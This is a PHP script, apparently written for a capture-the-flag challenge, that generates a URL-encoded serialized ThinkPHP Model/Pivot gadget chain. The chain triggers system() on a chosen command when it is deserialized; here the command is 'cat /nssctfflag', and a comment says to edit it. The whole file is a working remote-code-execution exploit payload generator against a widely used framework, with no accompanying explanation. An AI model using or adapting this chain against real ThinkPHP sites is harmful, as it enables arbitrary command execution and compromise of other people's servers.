<?php
 
namespace think {
    abstract class Model
    {
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj = '')
        {
            $this->lazySave = True;
            $this->data = ['whoami' => ['cat /nssctfflag']];#  这里需要自己进行更改！！！
            $this->exists = True;
            $this->table = $obj;
            $this->withAttr = ['whoami' => ['system']];
            $this->json = ['whoami', ['whoami']];
            $this->jsonAssoc = True;
        }
    }
}
 
namespace think\model {
 
    use think\Model;
 
    class Pivot extends Model
    {
    }
}
 
namespace {
    echo (urlencode(serialize(new think\model\Pivot(new think\model\Pivot()))));
}